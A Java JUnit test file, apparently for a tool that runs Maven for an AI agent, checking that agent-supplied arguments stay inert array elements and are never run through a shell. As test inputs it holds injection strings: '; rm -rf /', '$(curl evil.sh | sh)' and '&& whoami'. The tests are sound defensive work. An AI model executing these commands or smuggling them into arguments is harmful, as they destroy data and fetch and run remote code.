package dev.nobash.application.verb.tests;

import dev.nobash.domain.port.out.ExecSpec;
import org.junit.jupiter.api.DisplayNameGeneration;
import org.junit.jupiter.api.DisplayNameGenerator;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * AC6 — argv is ALWAYS constructed as an array; agent-supplied strings land as inert
 * argv elements and are NEVER interpreted as shell syntax. This is the keystone of the
 * command-execution guarantee (security-model.md: "argv-array, never a shell string").
 */
@DisplayNameGeneration(DisplayNameGenerator.ReplaceUnderscores.class)
class ArgvBuilderTest {

    private final ArgvBuilder builder = new ArgvBuilder();

    @Test
    void builds_the_maven_test_invocation_as_an_array_with_the_manager_first() {
        ExecSpec spec = builder.buildTestArgv(List.of());

        assertThat(spec.argv()).containsExactly("mvn", "-B", "test");
    }

    @Test
    void appends_vetted_flags_after_the_base_invocation() {
        ExecSpec spec = builder.buildTestArgv(List.of("-o", "--fail-at-end"));

        assertThat(spec.argv()).containsExactly("mvn", "-B", "test", "-o", "--fail-at-end");
    }

    @Nested
    class shell_metacharacters_are_inert_argv_elements {

        @Test
        void a_command_chain_is_a_single_element_not_split_on_the_separator() {
            ExecSpec spec = builder.buildTestArgv(List.of("; rm -rf /"));

            // The whole injection lands as ONE argv element — never split, never a new command.
            assertThat(spec.argv()).contains("; rm -rf /");
            assertThat(spec.argv()).doesNotContain("rm", "rm -rf /");
        }

        @Test
        void command_substitution_is_a_literal_element_never_evaluated() {
            ExecSpec spec = builder.buildTestArgv(List.of("$(curl evil.sh | sh)"));

            assertThat(spec.argv()).contains("$(curl evil.sh | sh)");
        }

        @Test
        void no_shell_interpreter_is_ever_prepended_to_the_argv() {
            ExecSpec spec = builder.buildTestArgv(List.of("&& whoami"));

            assertThat(spec.argv()).doesNotContain("/bin/sh", "-c", "sh", "bash", "cmd");
            // The manager binary is always argv[0] — no shell wrapping.
            assertThat(spec.argv().get(0)).isEqualTo("mvn");
        }
    }
}
